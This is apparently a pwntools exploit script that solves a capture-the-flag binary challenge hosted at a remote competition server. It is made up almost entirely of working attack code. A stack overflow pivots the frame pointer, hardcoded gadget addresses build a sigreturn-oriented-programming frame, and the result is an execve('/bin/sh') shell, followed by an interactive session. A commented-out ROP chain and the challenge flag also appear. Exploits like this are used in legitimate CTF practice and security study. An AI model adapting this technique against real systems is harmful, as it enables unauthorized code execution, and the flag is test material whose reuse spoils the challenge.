from pwn import *

exe = ELF("./static")

context.binary = exe



if args.LOCAL:
	r = process([exe.path])
	


else:
    r = remote("all.chal.cyberjousting.com", 1350)



#https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop

def main():


	target_rbp = 0x4a00a0


	payload = b"a"*10 + p64(target_rbp) + p64(0x4017F0)

	r.sendline(payload)



	binsh = b"/bin/sh\x00"
	address_binsh = target_rbp-10
	
	pop_rax = 0x41069c
	pop_rdi = 0x401fe0
	pop_rsi = 0x4062d8
	pop_rdx_rbx = 0x45e467
	syscall_ret = 0x404a12
	ret = 0x401016

	#payload = binsh.ljust(10, b"A")
	#payload += p64(0) #rbp
	#payload += p64(pop_rax) + p64(59) + p64(pop_rdi) + p64(address_binsh) + p64(pop_rsi) + p64(0) + p64(pop_rdx_rbx) + p64(0) + p64(0) + p64(ret)+p64(syscall)

	#r.sendline(payload)
	#r.sendline(b"cat ")
		
	frame = SigreturnFrame()
	frame.rax = 0x3b
	frame.rdi = address_binsh
	frame.rsi = 0
	frame.rdx = 0
	frame.rip = syscall_ret

	payload = binsh.ljust(10, b"A")
	payload += p64(0)
	payload += p64(pop_rax)
	payload += p64(0xf)
	payload += p64(syscall_ret)
	payload += bytes(frame)
	r.sendline(payload)



	r.interactive()

	# byuctf{glaD_you_c0uld_improvise_ROP_with_no_provided_gadgets!}



if __name__ == "__main__":
    main()
